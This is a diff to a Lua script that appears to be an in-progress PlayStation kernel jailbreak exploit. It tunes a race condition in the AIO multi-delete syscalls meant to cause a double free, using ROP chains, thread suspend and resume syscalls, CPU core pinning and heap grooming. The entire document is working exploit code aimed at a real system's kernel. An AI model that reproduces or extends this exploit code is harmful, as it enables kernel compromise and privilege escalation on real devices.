@@ -18,6 +18,7 @@ syscall.resolve({
     rtprio_thread = 0x1d2,
     
     thr_suspend_ucontext = 0x278,
+    thr_resume_ucontext = 0x279,
 
     aio_multi_delete = 0x296,
     aio_multi_wait = 0x297,
@@ -264,9 +265,9 @@ AIO_STATE_COMPLETE = 3
 AIO_STATE_ABORTED = 4
 
 
-MAIN_CORE = 2
+MAIN_CORE = 7
 MAIN_RTPRIO = 0x100
-AIO_MULTI_DELETE_CORE = 3
+AIO_MULTI_DELETE_CORE = 7
 
 NUM_WORKERS = 2
 NUM_GROOMS = 0x200
@@ -510,7 +511,7 @@ function reset_race_state()
     memory.write_qword(resume_signal, 0)
 end
 
-function prepare_aio_multi_delete_rop(sce_errs)
+function prepare_aio_multi_delete_rop(request_addr, sce_errs)
 
     local chain = ropchain()
 
@@ -523,9 +524,6 @@ function prepare_aio_multi_delete_rop(sce_errs)
     -- do aio delete operation
     chain:push_syscall(syscall.aio_multi_delete, request_addr, 1, sce_errs+4)
 
-    -- wait until it receives signal to resume
-    rop_wait_for(chain, resume_signal, "==", 0)
-
     return chain
 end
 
@@ -536,7 +534,7 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds)
     memory.write_dword(sce_errs, -1)
     memory.write_dword(sce_errs+4, -1)
     
-    local chain = prepare_aio_multi_delete_rop(sce_errs)
+    local chain = prepare_aio_multi_delete_rop(request_addr, sce_errs)
     local thr = prim_thread:new(chain)
     thr:prepare_structure()
     local thr_tid = thr:run()
@@ -544,27 +542,37 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds)
     printf("Race one thread ID: %d", thr_tid)
     memory.write_qword(start_signal, 1)
 
-    -- local suspend = syscall.thr_suspend_ucontext(thr_tid):tonumber()
-    -- printf("suspend %d: %d", thr_tid, suspend)
-
-    -- local error_func = fcall(libc_addrofs.error)
-    -- local errno = memory.read_qword(error_func()):tonumber()
-    -- printf("errno: %s", get_error_string())
+    local suspend = syscall.thr_suspend_ucontext(thr_tid):tonumber()
+    printf("suspend %d: %d", thr_tid, suspend)
 
     local won_race = false
 
-    local poll_err = memory.alloc(4);
+    local poll_err = memory.alloc(8);
     aio_multi_poll(request_addr, 1, poll_err)
     local poll_res = memory.read_dword(poll_err):tonumber()
     printf("poll: %x", poll_res)
 
-    local info_buf = memory.alloc(size_tcp_info)
+    local info_buf = memory.alloc(2*size_tcp_info)
     local info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, size_tcp_info)
     printf("info size: %x", info_size)
 
+    
+    printf("tcp state: %d", memory.read_dword(info_buf):tonumber())
     if info_size ~= size_tcp_info then
         dbgf("info size isn't " .. size_tcp_info .. ": " .. info_size)
     end
+
+    local SCE_KERNEL_ERROR_ESRCH = 0x80020003
+    -- if poll_res ~= SCE_KERNEL_ERROR_ESRCH then
+    --     aio_multi_delete(request_addr, 1, sce_errs)
+    --     won_race = true
+    -- end
+
+    local resume = syscall.thr_resume_ucontext(thr_tid):tonumber()
+    printf("resume %d: %d", thr_tid, suspend)
+
+    printf("race errors: 0x%x, 0x%x", memory.read_dword(sce_errs):tonumber(), memory.read_dword(sce_errs+4):tonumber())
+    
 end
 
 function double_free_reqs2(sds)
@@ -573,8 +581,8 @@ function double_free_reqs2(sds)
     end
 
     -- TODO: Find another path
-    local socket_path = "/mnt/sandbox/socket"
-    -- local socket_path = "/av_contents/content_tmp/socket"
+    -- local socket_path = "/mnt/sandbox/socket"
+    local socket_path = "/av_contents/content_tmp/socket" -- jb ps4
     
     local server_addr = memory.alloc(128)
     local addrlen = memory.alloc(8)
@@ -613,7 +621,7 @@ function double_free_reqs2(sds)
         error("listen() error: " .. get_error_string())
     end
 
-    -- NUM_RACES = 1
+    -- NUM_RACES = 20
     for i=1,NUM_RACES do
         print()
         printf("== attempt #%d ==", i)
@@ -641,7 +649,7 @@ function double_free_reqs2(sds)
         if syscall.setsockopt(client_fd, SOL_SOCKET, SO_LINGER, tmp_buffer, 8):tonumber() < 0 then
             print("setsockopt() error: " .. get_error_string())
         end
-        memory.write_dword(reqs1 + which_req*0x28 + 0x20, client_fd)
+        memory.write_dword(reqs1 + (which_req*0x28) + 0x20, client_fd)
 
         aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids)
         aio_multi_cancel(aio_ids, num_reqs)
